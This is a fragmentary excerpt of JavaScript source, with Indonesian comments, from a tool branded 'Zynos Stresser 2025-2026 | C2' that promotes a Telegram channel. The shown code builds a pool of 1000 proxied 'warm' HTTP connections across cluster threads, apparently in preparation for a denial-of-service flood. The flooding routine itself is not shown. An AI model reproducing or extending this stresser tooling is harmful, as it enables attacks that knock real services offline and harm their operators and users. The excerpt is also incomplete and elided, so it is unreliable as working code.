...
// ========== NET SOCKET CLASS (DIPINDAH KE ATAS) ==========
class NetSocket {
    constructor() { }
...
const WARM_CONNECTIONS = 1000; // total 1000 koneksi warm di seluruh thread
let warmPool = [];
...
if (cluster.isMaster) {
    ...
    console.log(`\x1b[33mWarm Pool: \x1b[32m${WARM_CONNECTIONS} koneksi\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    // Init warm pool di master
    console.log(`\x1b[33m[+] Membangun ${WARM_CONNECTIONS} koneksi warm...\x1b[0m`);
    initWarmPool(() => {
        console.log(`\x1b[32m[+] Warm pool siap! Memulai ${args.threads} thread...\x1b[0m`);
...
// ========== WARM POOL SYSTEM ==========
function createWarmConnection(callback) {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return callback(null);
...
function initWarmPool(callback) {
    let completed = 0;
    let success = 0;
    for (let i = 0; i < WARM_CONNECTIONS; i++) {
        createWarmConnection((client) => {
            if (client) {
                warmPool.push(client);
                success++;
            }
            completed++;
            if (completed === WARM_CONNECTIONS) {
                console.log(`\x1b[32m[WARM POOL] ${success}/${WARM_CONNECTIONS} koneksi berhasil!\x1b[0m`);
                callback();
            }
        });
    }
